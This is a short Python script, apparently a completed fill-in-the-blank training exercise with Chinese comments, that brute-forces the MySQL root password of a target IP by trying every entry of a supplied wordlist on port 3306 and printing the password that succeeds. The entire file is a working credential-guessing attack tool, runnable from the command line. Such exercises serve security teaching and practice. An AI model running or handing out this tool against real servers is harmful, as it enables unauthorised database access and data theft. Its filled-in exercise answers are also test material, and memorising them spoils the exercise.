"""
本题以 mysql弱口令为例
pip install pymysql
"""

import pymysql # 导库
import argparse # 导库

def a(target_ip,passwords): # 自定义
    fp = open(f'{passwords}', 'r', encoding='utf-8-sig') # 读取文件
    pwd_list = [*fp.readlines()] #[__F1__] # 将读取到的文件，以列表的形式保存到变量中
    fp.close() # 关闭文件
    result_pwd = '' # 创建变量
    for i in pwd_list: # 根据文件大小进行循环
        try: # 尝试运行
            db = pymysql.connect(
                host=target_ip, #__F2__, # 确定靶机IP
                port=3306, # 连接端口
                user="root", # 用户名
                password=i[:-1], #__F3__, # 密码输出
                connect_timeout=2) # 连接两秒
        except: # 运行失败就
            continue #__F4__ # 继续

        result_pwd = i # 确认密码
        break #__F5__ # 停止运行
#if result_pwd != '': #__F6__:
    if result_pwd not in '': #__F6__: # 如果密码发生改变
        print(f"{target_ip}连接成功，密码为：{result_pwd}") # 打印结果
    else: # 否则
        print('爆破失败') # 打印结果
if __name__=="__main__": # 运行以上代码
    parser=argparse.ArgumentParser(description="fishing here") # 创建解析对象
    parser.add_argument("-H",required=True,help="target_ip",dest="HostIP") # 向该对象中添加你要关注的命令行参数和选项
    parser.add_argument("-f",required=True,help="FileWords",dest="PassWord") # 向该对象中添加你要关注的命令行参数和选项
    args=parser.parse_args() #进行解析
    print(args) # 打印解析结果

    target_ip=args.HostIP # 锁定IP
    PassWord=args.PassWord # 指向密码字典
    a(target_ip, PassWord) # 调用自定义函数